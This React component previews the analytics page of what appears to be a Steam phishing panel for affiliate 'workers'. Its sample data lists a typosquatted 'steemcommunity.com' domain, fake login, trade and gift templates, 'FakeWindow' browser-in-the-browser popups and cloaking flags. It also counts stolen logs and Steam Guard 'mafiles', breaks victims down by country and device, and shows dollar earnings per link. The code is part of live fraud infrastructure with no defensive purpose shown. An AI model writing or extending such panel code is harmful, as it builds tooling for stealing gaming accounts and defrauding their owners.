import { useEffect, useRef, useState } from "react";
import analyticsUrl from "../../../panel/worker/js/views/analytics.js?url";
import "../../../panel/worker/css/worker.css";
import "../../../panel/worker/css/panel-extra.css";
import {
  ensurePanelViewRuntime,
  PREVIEW_USER,
} from "./panelRuntime";
import "./wallet-host.css";

const PREVIEW_ANALYTICS_DOMAINS = {
  steamFunnel: { logs: 247, mafiles: 11 },
  totalLogs: 247,
  totalMafiles: 11,
  domains: [
    {
      id: 1,
      domain: "demo-shop.example",
      online: 12,
      isOwn: true,
      isTeamPublic: false,
      isPaused: false,
      createdAt: new Date(Date.now() - 3600_000).toISOString(),
      linksCount: 3,
      stats: { views: 1609, clicks: 907, auths: 637, logs: 245, mafiles: 11, earnedUsd: 2117.75 },
      links: [
        {
          id: 11,
          path: "login",
          windowType: "FakeWindow",
          templateName: "Steam Login",
          iframe: true,
          online: 8,
          isPaused: false,
          stats: {
            views: 1329,
            clicks: 851,
            auths: 597,
            logs: 233,
            mafiles: 9,
            earnedUsd: 1840.5,
            desktopPercent: 25.26,
          },
          countries: [
            { code: "US", count: 214 },
            { code: "TR", count: 186 },
            { code: "CZ", count: 94 },
            { code: "DE", count: 81 },
            { code: "PT", count: 64 },
            { code: "ES", count: 51 },
            { code: "FR", count: 44 },
          ],
          devices: [
            { name: "Apple", count: 342 },
            { name: "Android", count: 336 },
            { name: "Windows", count: 201 },
            { name: "Linux", count: 19 },
          ],
        },
        {
          id: 12,
          path: "offer",
          windowType: "CurrentWindow",
          templateName: "Steam Market",
          cloaking: true,
          online: 3,
          isPaused: false,
          stats: {
            views: 140,
            clicks: 28,
            auths: 9,
            logs: 3,
            mafiles: 1,
            earnedUsd: 62,
            desktopPercent: 19.77,
          },
          countries: [
            { code: "TR", count: 42 },
            { code: "US", count: 31 },
            { code: "DE", count: 18 },
          ],
          devices: [
            { name: "Android", count: 54 },
            { name: "Windows", count: 28 },
            { name: "Apple", count: 22 },
          ],
        },
        {
          id: 13,
          path: "gift",
          windowType: "NewWindow",
          templateName: "Steam Gift",
          online: 1,
          isPaused: false,
          stats: {
            views: 140,
            clicks: 28,
            auths: 31,
            logs: 9,
            mafiles: 1,
            earnedUsd: 215.25,
            desktopPercent: 33.1,
          },
          countries: [
            { code: "US", count: 40 },
            { code: "PL", count: 22 },
          ],
          devices: [
            { name: "Windows", count: 48 },
            { name: "Apple", count: 30 },
          ],
        },
      ],
    },
    {
      id: 2,
      domain: "steemcommunity.com",
      online: 3,
      isOwn: false,
      isTeamPublic: true,
      isPaused: false,
      createdAt: new Date(Date.now() - 86400_000 * 6).toISOString(),
      linksCount: 2,
      stats: { views: 268, clicks: 52, auths: 16, logs: 5, mafiles: 1, earnedUsd: 53.5 },
      links: [
        {
          id: 21,
          path: "auth",
          windowType: "FakeWindow",
          templateName: "Steam Login",
          online: 2,
          isPaused: false,
          stats: {
            views: 180,
            clicks: 36,
            auths: 11,
            logs: 3,
            mafiles: 1,
            earnedUsd: 41,
            desktopPercent: 41.2,
          },
          countries: [
            { code: "DE", count: 48 },
            { code: "NL", count: 29 },
          ],
          devices: [
            { name: "Windows", count: 72 },
            { name: "Android", count: 41 },
          ],
        },
        {
          id: 22,
          path: "trade",
          windowType: "CurrentWindow",
          templateName: "Steam Trade",
          online: 1,
          isPaused: true,
          stats: {
            views: 88,
            clicks: 16,
            auths: 5,
            logs: 2,
            mafiles: 0,
            earnedUsd: 12.5,
            desktopPercent: 28.4,
          },
          countries: [{ code: "US", count: 22 }],
          devices: [{ name: "Apple", count: 18 }],
        },
      ],
    },
    {
      id: 3,
      domain: "falconspro.icu",
      online: 0,
      isOwn: true,
      isTeamPublic: false,
      isPaused: true,
      createdAt: new Date(Date.now() - 86400_000 * 16).toISOString(),
      linksCount: 0,
      stats: { views: 0, clicks: 0, auths: 0, logs: 0, mafiles: 0, earnedUsd: 0 },
      links: [],
    },
  ],
};

function installPreviewAnalyticsApi() {
  window.WorkerShell = {
    ...(window.WorkerShell || {}),
    navigate() {},
    currentView() {
      return "analytics";
    },
  };
  window.WorkerAPI = {
    async get(path: string) {
      const clean = String(path || "").split("?")[0];
      if (clean === "/sites/domains") {
        return PREVIEW_ANALYTICS_DOMAINS;
      }
      return {};
    },
    async post() {
      return { ok: true };
    },
    async patch() {
      return { ok: true };
    },
    async del() {
      return { ok: true };
    },
    bust() {},
  };
}

/**
 * Thin host for worker-panel analytics view (`panel/worker/js/views/analytics.js`).
 */
export default function AnalyticsPage() {
  const hostRef = useRef<HTMLDivElement>(null);
  const [error, setError] = useState("");

  useEffect(() => {
    const host = hostRef.current;
    if (!host) return;

    let cancelled = false;

    (async () => {
      try {
        installPreviewAnalyticsApi();
        await ensurePanelViewRuntime(analyticsUrl);
        if (cancelled) return;
        const render = window.WorkerViews?.analytics;
        if (typeof render !== "function") {
          throw new Error("WorkerViews.analytics is not available");
        }
        await render({
          main: host,
          user: PREVIEW_USER,
          refresh: true,
        });
      } catch (err) {
        if (!cancelled) {
          setError(err instanceof Error ? err.message : String(err));
        }
      }
    })();

    return () => {
      cancelled = true;
      const state = window.WorkerViews?.analyticsState as
        | { _pollTimer?: ReturnType<typeof setInterval> | null }
        | undefined;
      if (state?._pollTimer) {
        clearInterval(state._pollTimer);
        state._pollTimer = null;
      }
      document.body.classList.remove("analytics-drawer-open");
      const drawer = document.getElementById("analyticsDrawer");
      if (drawer) {
        drawer.hidden = true;
        drawer.classList.remove("is-open");
      }
      host.replaceChildren();
    };
  }, []);

  return (
    <div className="gwl-host">
      {error ? <p className="gwl-host__error">{error}</p> : null}
      <div className="main" ref={hostRef} />
    </div>
  );
}
